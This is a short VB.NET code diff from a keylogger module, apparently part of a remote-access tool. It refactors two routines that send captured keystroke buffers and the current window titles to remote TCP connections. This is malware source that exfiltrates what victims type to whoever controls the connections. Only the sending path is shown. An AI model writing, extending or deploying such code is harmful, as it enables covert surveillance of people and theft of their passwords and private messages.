@@ -125,7 +125,7 @@ Namespace KeyloggerModule
         End Sub
 
         Sub sendChange(ByVal value As String)
-            Dim connections = Form1.remoteTcp.getRandomConnectionOrder()
+            Dim connections = TcpRemoteControl.remoteTcp.getRandomConnectionOrder()
             connections.ForEach(
                 Sub(c)
                     c.send("anscurrwindow" & value)
@@ -157,7 +157,7 @@ Namespace KeyloggerModule
             keylogBuffer = ""
         End Sub
         Sub sendKeyBuffer(value As String)
-            Dim connections = Form1.remoteTcp.getRandomConnectionOrder()
+            Dim connections = TcpRemoteControl.remoteTcp.getRandomConnectionOrder()
             connections.ForEach(
                 Sub(c)
                     c.send("anskeybuffer" & value)
